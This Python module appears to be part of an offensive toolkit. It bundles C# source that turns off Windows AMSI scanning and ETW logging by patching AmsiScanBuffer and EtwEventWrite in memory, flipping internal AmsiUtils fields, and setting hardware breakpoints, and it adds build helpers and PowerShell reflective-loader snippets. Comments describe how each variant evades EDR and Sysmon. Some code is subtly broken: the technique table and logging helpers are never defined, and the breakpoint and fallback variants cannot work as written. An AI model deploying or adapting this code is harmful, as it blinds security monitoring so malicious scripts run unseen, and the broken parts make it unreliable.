"""
AMSI and ETW bypass techniques.

This module packages well-known public bypass techniques as compile-
able C# source. Each technique:

  - Is a self-contained .NET Framework 4.8 assembly
  - Exposes a public static method named `Patch()` (AMSI) or
    `Patch()` (ETW)
  - Works via reflection, without touching disk
  - Runs inside the current process only

Usage from PowerShell:

    $bytes = [IO.File]::ReadAllBytes("AmsiBypass.dll")
    $asm = [Reflection.Assembly]::Load($bytes)
    $asm.GetType("AmsiBypass").GetMethod("Patch").Invoke($null, @())

Techniques available:

  AMSI:
    reflection_patch    Patch amsi.dll!AmsiScanBuffer with a mov/ret
    context_patch       Patch the amsiContext object to report clean
    reflection_disable  Set AmsiUtils.amsiInitFailed = true
    hwbp                Hardware breakpoint on AmsiScanBuffer

  ETW:
    etw_patch           Patch ntdll!EtwEventWrite with a ret

Each technique is designed to be callable via `compile(name)` from
this module, which compiles through the payload framework and
returns the built bytes.

DISCLAIMER: These are public techniques. The toolkit does not
attempt to hide them from endpoint protection. Running these
against a machine you don't control or don't have written
authorization for is a criminal offense.
"""

AMSI_REFLECTION_PATCH = r"""
using System;
using System.Runtime.InteropServices;

namespace AmBypass
{
    public static class AmsiBypass
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                                           uint flNewProtect, out uint lpflOldProtect);

        // PATCH:  0xB8 0x57 0x00 0x07 0x80 0xC3
        //   mov eax, 0x80070057   ; E_INVALIDARG
        //   ret
        // Effect: AmsiScanBuffer returns E_INVALIDARG immediately.
        // AMSI callers treat this as "cannot scan" and pass the
        // buffer through unmodified.
        static byte[] patch = new byte[] {
            0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
        };

        public static void Patch()
        {
            IntPtr hAmsi = GetModuleHandle("amsi.dll");
            if (hAmsi == IntPtr.Zero)
                throw new Exception("amsi.dll not loaded in current process");

            IntPtr pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
            if (pAmsiScanBuffer == IntPtr.Zero)
                throw new Exception("AmsiScanBuffer not found");

            uint old;
            if (!VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length,
                               0x40 /* PAGE_EXECUTE_READWRITE */, out old))
                throw new Exception("VirtualProtect failed");

            Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);

            uint restore;
            VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length,
                          old, out restore);
        }
    }
}
"""


AMSI_CONTEXT_PATCH = r"""
using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace AmBypass
{
    public static class AmsiBypass
    {
        // This technique replaces the AmsiContext pointer that
        // AmsiScanBuffer uses with a fake context that causes the
        // function to bail out early.
        //
        // Implementation note: this is the reflection-based variant
        // published by various security researchers. It walks the
        // CLR's type system to locate the internal amsiContext
        // field on System.Management.Automation.AmsiUtils.
        //
        // If that type isn't present (e.g. we're not running inside
        // PowerShell), we fall back to the amsi.dll patch.
        public static void Patch()
        {
            Type amsiUtils = Type.GetType(
                "System.Management.Automation.AmsiUtils," +
                " System.Management.Automation");
            if (amsiUtils == null)
            {
                // Not running in PowerShell — apply the amsi.dll
                // patch instead.
                AmBypassFallback.AmsiBypass.Patch();
                return;
            }

            FieldInfo amsiContext = amsiUtils.GetField(
                "amsiContext",
                BindingFlags.NonPublic | BindingFlags.Static);
            if (amsiContext == null)
                throw new Exception("amsiContext field not found");

            FieldInfo amsiInitFailed = amsiUtils.GetField(
                "amsiInitFailed",
                BindingFlags.NonPublic | BindingFlags.Static);
            if (amsiInitFailed != null)
                amsiInitFailed.SetValue(null, true);
        }
    }

    // Inline fallback for the amsi.dll patch, used when this
    // assembly is loaded outside PowerShell.
    internal static class AmBypassFallback
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                                           uint flNewProtect, out uint lpflOldProtect);

        static byte[] patch = new byte[] {
            0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
        };

        public static void Patch()
        {
            IntPtr hAmsi = GetModuleHandle("amsi.dll");
            if (hAmsi == IntPtr.Zero)
                throw new Exception("amsi.dll not loaded");
            IntPtr p = GetProcAddress(hAmsi, "AmsiScanBuffer");
            if (p == IntPtr.Zero)
                throw new Exception("AmsiScanBuffer not found");
            uint old;
            VirtualProtect(p, (UIntPtr)patch.Length, 0x40, out old);
            Marshal.Copy(patch, 0, p, patch.Length);
            uint r;
            VirtualProtect(p, (UIntPtr)patch.Length, old, out r);
        }
    }
}
"""


AMSI_REFLECTION_DISABLE = r"""
using System;
using System.Reflection;

namespace AmBypass
{
    public static class AmsiBypass
    {
        // Sets the internal flag AmsiUtils.amsiInitFailed = true.
        // PowerShell's AMSI integration checks this flag before
        // calling into amsi.dll; once set, all scanning is skipped.
        //
        // This technique doesn't touch amsi.dll at all, which means
        // it survives memory scanners that look for patched code
        // sections. It's also the least reliable because the field
        // name has changed across PowerShell versions.
        public static void Patch()
        {
            Type amsiUtils = Type.GetType(
                "System.Management.Automation.AmsiUtils," +
                " System.Management.Automation");
            if (amsiUtils == null)
                throw new Exception(
                    "System.Management.Automation.AmsiUtils not found; " +
                    "this technique requires PowerShell");

            FieldInfo initFailed = amsiUtils.GetField(
                "amsiInitFailed",
                BindingFlags.NonPublic | BindingFlags.Static);
            if (initFailed == null)
                throw new Exception("amsiInitFailed field not found");

            initFailed.SetValue(null, true);
        }
    }
}
"""


AMSI_HWBP = r"""
using System;
using System.Runtime.InteropServices;

namespace AmBypass
{
    public static class AmsiBypass
    {
        // Uses hardware breakpoints (debug registers) to redirect
        // AmsiScanBuffer to a function that returns E_INVALIDARG.
        //
        // Hardware breakpoints are set via the thread context (DR0-DR7
        // registers). No memory is written to amsi.dll, so EDR
        // products that scan for modified code sections won't see
        // anything.
        //
        // This is the most robust technique against modern EDR, and
        // also the most complex to implement correctly.

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT ctx);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT ctx);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size,
                                           uint allocType, uint protect);

        [StructLayout(LayoutKind.Sequential)]
        struct M128A { public ulong Low; public long High; }

        [StructLayout(LayoutKind.Sequential)]
        struct CONTEXT
        {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public uint ContextFlags;
            public uint MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10,
                         R11, R12, R13, R14, R15, Rip;
            public M128A Xmm0, Xmm1, Xmm2, Xmm3, Xmm4, Xmm5, Xmm6, Xmm7,
                         Xmm8, Xmm9, Xmm10, Xmm11, Xmm12, Xmm13, Xmm14, Xmm15;
        }

        static byte[] stub = new byte[] {
            0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3   // mov eax, E_INVALIDARG; ret
        };

        public static void Patch()
        {
            IntPtr hAmsi = GetModuleHandle("amsi.dll");
            if (hAmsi == IntPtr.Zero)
                throw new Exception("amsi.dll not loaded");
            IntPtr target = GetProcAddress(hAmsi, "AmsiScanBuffer");
            if (target == IntPtr.Zero)
                throw new Exception("AmsiScanBuffer not found");

            // Allocate a small executable page for our stub
            IntPtr stubMem = VirtualAlloc(IntPtr.Zero, (UIntPtr)stub.Length,
                                          0x3000 /* COMMIT|RESERVE */,
                                          0x40   /* PAGE_EXECUTE_READWRITE */);
            if (stubMem == IntPtr.Zero)
                throw new Exception("VirtualAlloc for stub failed");
            Marshal.Copy(stub, 0, stubMem, stub.Length);

            // Set DR0 = AmsiScanBuffer, DR7 = enable local breakpoint 0
            IntPtr hThread = GetCurrentThread();
            CONTEXT ctx = new CONTEXT();
            ctx.ContextFlags = 0x00100000;  // CONTEXT_DEBUG_REGISTERS
            if (!GetThreadContext(hThread, ref ctx))
                throw new Exception("GetThreadContext failed");
            ctx.Dr0 = (ulong)target.ToInt64();
            ctx.Dr7 = (ctx.Dr7 & ~0xFUL) | 0x1UL;  // enable L0
            if (!SetThreadContext(hThread, ref ctx))
                throw new Exception("SetThreadContext failed");
        }
    }
}
"""

AMSI_ALLOC_HGLOBAL = r"""
using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace AmBypass
{
    public static class AmsiBypass
    {
        // Point PowerShell's AMSI context at an empty buffer and
        // null out the session handle. AMSI ends up scanning a
        // blank context and always returns clean.
        //
        // This technique NEVER writes to amsi.dll's code section.
        // It only modifies managed fields on the
        // System.Management.Automation.AmsiUtils type. No
        // VirtualProtect on executable memory, no prologue
        // modification, no Behavior:Win32/AMSI_Patch_* trigger.
        //
        // Side effects:
        //   - Leaks one 9076-byte heap allocation per invocation
        //     (the fake context buffer is never freed).
        //   - Only works inside PowerShell. Throws if the
        //     AmsiUtils type is not present in the current AppDomain.
        public static void Patch()
        {
            Type amsiUtils = Type.GetType(
                "System.Management.Automation.AmsiUtils," +
                " System.Management.Automation");
            if (amsiUtils == null)
                throw new Exception(
                    "System.Management.Automation.AmsiUtils not found; " +
                    "this technique requires PowerShell");

            // 9076 is the size of the internal AMSI_CONTEXT
            // structure that Windows allocates for each AMSI
            // session. Allocating a buffer of exactly that size
            // means AmsiScanBuffer finds a well-formed (empty)
            // context when it dereferences the pointer.
            IntPtr fakeContext = Marshal.AllocHGlobal(9076);

            // Null the session handle. PowerShell will re-open a
            // session on the next scan, but with the context
            // already swapped, the new session becomes inert.
            FieldInfo sessionField = amsiUtils.GetField(
                "amsiSession",
                BindingFlags.NonPublic | BindingFlags.Static);
            if (sessionField != null)
                sessionField.SetValue(null, null);

            // Swap the context pointer.
            FieldInfo contextField = amsiUtils.GetField(
                "amsiContext",
                BindingFlags.NonPublic | BindingFlags.Static);
            if (contextField == null)
                throw new Exception("amsiContext field not found");
            contextField.SetValue(null, fakeContext);
        }
    }
}
"""

ETW_PATCH = r"""
using System;
using System.Runtime.InteropServices;

namespace EtwBypass
{
    public static class EtwPatch
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                                           uint flNewProtect, out uint lpflOldProtect);

        // Replace EtwEventWrite's prologue with a ret. Every ETW
        // event the process would emit is short-circuited at the
        // very first instruction. Sysmon, ETW-based EDR, and all
        // other event consumers see nothing from this process.
        //
        // Note: ntdll is loaded once, so this patch affects every
        // thread in the process (not just the current thread).
        public static void Patch()
        {
            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
            if (hNtdll == IntPtr.Zero)
                throw new Exception("ntdll.dll not loaded");

            IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
            if (pEtwEventWrite == IntPtr.Zero)
                throw new Exception("EtwEventWrite not found");

            uint old;
            if (!VirtualProtect(pEtwEventWrite, (UIntPtr)1,
                               0x40, out old))
                throw new Exception("VirtualProtect failed");

            // 0xC3 = ret
            byte[] patch = new byte[] { 0xC3 };
            Marshal.Copy(patch, 0, pEtwEventWrite, 1);

            uint restore;
            VirtualProtect(pEtwEventWrite, (UIntPtr)1, old, out restore);
        }
    }
}
"""

# Compile

def compile(name: str, verbose: bool = False):
    """Compile a bypass technique via the payload framework.

    Returns a Payload object. Call .built_bytes to get the compiled
    DLL bytes, or .save(workspace) to copy into the workspace.

    Always targets net48 because the intended host is Windows
    PowerShell 5.1 (which runs on .NET Framework 4.8).
    """
    spec = TECHNIQUES.get(name)
    if spec is None:
        raise ValueError(
            f"unknown technique: {name!r}; available: "
            f"{', '.join(sorted(TECHNIQUES.keys()))}")

    from payload import framework

    # Assembly name is derived from the class so the loader code
    # in PowerShell can reference it stably.
    class_name = spec["class"].split(".")[-1]

    p = framework.Payload(
        language="csharp",
        source=spec["source"],
        target="net48",
        extra_files={
            "__output_type": "Library",
            "__assembly_name": class_name,
            "__namespace": spec["class"].split(".")[0],
        },
        post_processing=[],   # raw DLL, no encoding
        description=f"av_bypass {name}",
    )

    if verbose:
        info(f"  compiling {name} ({spec['kind']}) → "
             f"{class_name}.dll (net48)")

    p.build(verbose=verbose)
    return p


def compile_all(verbose: bool = False) -> dict:
    """Compile every technique. Returns {name: Payload}."""
    out = {}
    for name in TECHNIQUES:
        try:
            out[name] = compile(name, verbose=verbose)
        except Exception as e:
            warn(f"  failed to compile {name}: "
                 f"{type(e).__name__}: {e}")
    return out


# =====================================================================
# PowerShell loader snippets
# =====================================================================

def loader_ps1(name: str, dll_path: str | None = None) -> str:
    """Return a PowerShell snippet that loads and invokes a technique.

    If dll_path is given, the snippet reads the file from disk.
    Otherwise it assumes the DLL bytes are already in a variable
    called $bytes.
    """
    spec = TECHNIQUES.get(name)
    if spec is None:
        raise ValueError(f"unknown technique: {name!r}")

    cls = spec["class"]
    method = spec["method"]

    if dll_path:
        # Normalize Windows path separators for the PowerShell string
        path_escaped = dll_path.replace("\\", "\\\\")
        read_line = (
            f'$bytes = [IO.File]::ReadAllBytes("{path_escaped}")'
        )
    else:
        read_line = "$bytes = <your bytes here>"

    return (
        f"{read_line}\n"
        f"$asm = [Reflection.Assembly]::Load($bytes)\n"
        f"$asm.GetType(\"{cls}\").GetMethod(\"{method}\")"
        f".Invoke($null, @())\n"
    )

def list_techniques() -> list[dict]:
    """Return a list of {name, kind, class, method, description}."""
    out = []
    for name in sorted(TECHNIQUES):
        spec = TECHNIQUES[name]
        out.append({
            "name": name,
            "kind": spec["kind"],
            "class": spec["class"],
            "method": spec["method"],
            "description": spec["description"],
        })
    return out
